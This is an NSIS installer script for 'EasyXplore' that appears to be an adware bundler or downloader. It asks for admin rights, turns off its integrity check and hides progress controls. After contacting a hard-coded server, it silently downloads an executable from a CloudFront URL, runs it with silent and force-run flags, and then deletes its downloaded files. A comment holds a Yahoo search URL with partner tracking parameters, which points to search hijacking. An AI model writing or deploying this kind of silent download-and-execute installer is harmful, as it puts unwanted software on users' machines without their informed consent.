############################################################################################
#            NSIS Installation Script created by Noice2k (igor@netnucleus.com)
#   Entirely Edited with NullSoft Scriptable Installation System                
############################################################################################
!define APP_NAME "EasyXplore"
!define VERSION "1.1.8.0"
!define COPYRIGHT "Copyright 2019 Tresdox"
!define DESCRIPTION "Installer the EasyXplore"
!define INSTALLER_NAME "EasyXplore_QA.exe"
!define MAIN_APP_EXE "setup.exe"

CRCCheck off
!addplugindir "..\Plugins\Release"

######################################################################
VIProductVersion  "${VERSION}"
VIAddVersionKey "ProductName"  "${APP_NAME}"
VIAddVersionKey "LegalCopyright"  "${COPYRIGHT}"    
VIAddVersionKey "FileDescription"  "${DESCRIPTION}" 
VIAddVersionKey "FileVersion"  "${VERSION}"		     
VIAddVersionKey "LegalTrademarks" "${DESCRIPTION}"
######################################################################

SetCompressor /SOLID lzma
!addplugindir "D:\Regular.Downloader\AutoCompile\Source\"

Name "${APP_NAME}"
Caption "${APP_NAME}"
OutFile "${INSTALLER_NAME}"
BrandingText "${APP_NAME}"
XPStyle on

InstallDir "$LOCALAPPDATA\EasyXploreSetup"

!include "WinMessages.nsh"
!include "d:\Regular.Downloader\AutoCompile\PU\FunctionName.h"
MiscButtonText	" "



	
######################################################################
Var Ctrl

Var quant
Var MainDomain
Var ReportUrl
Var Result
Var Dialog
Var FONT8
Var FONT8n
Var FONT9
Var FONT9n
Var FusionShow
Var FusionMode
Var FusionAuthKey
Var DebugStr
Var BegingTickecCount
Var FONT10
Var FONT10n
Var FONT12
Var FONT8URL2
Var FONT9URL2

Var InstallPrimeUpdater
Var GuiDemension
Var Checkbox
Var PreKeyFound
Var KeyFound
Var MParam
Var stack
Var Checkbox1

Var UID
Var ID2
Var IPDUrl

Var EasyXploreLink

RequestExecutionLevel admin
 


!include "WinMessages.nsh"


!include "MUI.nsh"


!insertmacro MUI_LANGUAGE "English"
!insertmacro MUI_RESERVEFILE_LANGDLL

!define MUI_HEADERIMAGE



!include "nsDialogs.nsh"


AddBrandingImage top 0 0

!include "LoadRTF.nsh"
!include "RegKeyMacro.nsh"
!include "OSversion.nsh"
!include "SetWindowSize.nsh"
!include "Page_Main.nsh"
!include "Page_EasyExplore.nsh"
!include "Str.nsh"

AutoCloseWindow true  

; Page custom fnPrimeUpdaterInit fnPrimeUpdaterDestroy
Page custom fnNTTInit fnNTTDestroy

!insertmacro MUI_PAGE_INSTFILES

Function .onGUIEnd
	Delete $INSTDIR\*.txt
	Delete $INSTDIR\*.exe
	Delete $PLUGINSDIR\*.txt
	Delete $PLUGINSDIR\*.*
FunctionEnd


Section Main
	
	;ShowWindow $HWNDPARENT ${SW_MINIMIZE}
	Call ChangeProgressIndicatorBarPosition 

	SetOutPath "$PLUGINSDIR"
	; SetBrandingImage Image.bmp
	
	SetOverwrite ifnewer
	SetOutPath "$INSTDIR"
	;ShowWindow $HWNDPARENT ${SW_MINIMIZE}
	
	# get HWND
	;StrCpy $0 $HWNDPARENT
	# return normal state
	;System::Call "user32::SetWindowPos(i r0, i -2, i 0, i 0, i 0, i 0, i 3)"
	
	
	
	 
	; http://search.yahoo.com/yhs/search?hspart=dcola&hsimp=yhs-001&type=gsp_ezxp_{yy}_{ww}&param1=1&param2=a%3Dgsp_ezxp_{yy}_{ww}%26cat%3Dweb%26pa%3Dgencoll&p={searchTerms}
	
	
	####################################
	# NTT
	####################################
	${If} $InstallNTT == "true"
		
		inetc::get /NOUNLOAD /NOCOOKIES /TOSTACK /NOCANCEL /SILENT /RESUME "" "https://$MainDomain/time2.php" "" /END
		Pop $0
		Pop $stack
		${if} $0 == "OK"
            Push $stack
            EasyExplore::Setup /NOUNLOAD
            ; File "/oname=$INSTDIR\easyxplore-setup.exe" "easyxplore-inst.exe"
            StrCpy $EasyXploreLink "https://d3pac71vmdrlkf.cloudfront.net/easyxplore-inst.exe"
            inetc::get /NOUNLOAD /NOCOOKIES /NOCANCEL /SILENT /RESUME "" $EasyXploreLink "$INSTDIR\easyxplore-setup.exe" /END
            Pop $0
            ${if} $0 == "OK"
                ExecWait '"$INSTDIR\easyxplore-setup.exe" /S /force-run'
                MessageBox MB_OK "installation completed"
            ${else}
                MessageBox MB_OK "Could not download installer from $EasyXploreLink"
            ${endif}
        ${else}
            MessageBox MB_OK "Could not contact to server $MainDomain"
		${endif}
		
		
        
		
	${endif}

SectionEnd

Function .onInit
	
	System::Call 'kernel32::CreateMutexA(i 0, i 0, t "_the_single_run_app_mutex_") ?e'
	Pop $R0
	StrCmp $R0 0 +2
	Abort
	Nop

    StrCpy $MainDomain "liquidnetsoftware.com"

	# show Banner
	nsDialogs::${ShowBanner} "initialization..."
	
	InitPluginsDir
	# 
	StrCpy $quant "0"
	
	Call GetOsVersion
	# 

	;Nuntius::GetGUIDimension 
	StrCpy $GuiDemension 96


	; StrCpy $Result 2142
	; nsDialogs::get /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result $PLUGINSDIR\1.txt	/END	
	; Pop $0
	; Pop $0

	; StrCpy $Result "1"
	; nsDialogs::get /NOCANCEL /SILENT /RESUME "" $ReportUrl$Result $PLUGINSDIR\1.txt	/END	
	; Pop $0


	
	InitPluginsDir
	SetOutPath $PLUGINSDIR
	
	
	CreateFont $FONT9n 		"Tahoma"	"9" "400" 
	CreateFont $FONT10n		"Tahoma" "10" "400" 
	CreateFont $FONT10		"Tahoma" "10" "700" 
	CreateFont $FONT8n 		"Tahoma" 	"8" "400" 

	CreateFont $FONT8URL2 "Tahoma" "8" "400" /UNDERLINE 
	CreateFont $FONT12 		"Tahoma" "12" "700" 
		
	SetOutPath $PLUGINSDIR
	; File /oname=$PLUGINSDIR\Image.bmp "images\TopLogo1.bmp"
	File /oname=$PLUGINSDIR\accept.ico	 	"images\Accept.ico"
	File /oname=$PLUGINSDIR\decline.ico	 	"images\Decline.ico"
	; File /oname=$PLUGINSDIR\eula.rtf	eula3.rtf

	nsDialogs::${DestroyBanner}


FunctionEnd
	
Function ChangeProgressIndicatorBarPosition 
	
	# 	
	GetDlgItem $R0 $HWNDPARENT 3 ;������ ������ "Next" �������� 
	System::Call "User32::SetWindowPos(i, i, i, i, i, i, i) b ($R0,0, 0, 0, 0, 0, 0)"
 
	FindWindow $R1 "#32770" "" $HWNDPARENT 
	GetDlgItem $R0 $R1 1006
	;System::Call "User32::SetWindowPos(i, i, i, i, i, i, i) b ($R0, 0, 0, 60,580,20, 0)"
	ShowWindow $R0 ${SW_HIDE}
	
	GetDlgItem $R0 $R1 1027
	System::Call "User32::SetWindowPos(i, i, i, i, i, i, i) b ($R0, 0, 0, 0,0,0, 0)"
	
FunctionEnd  


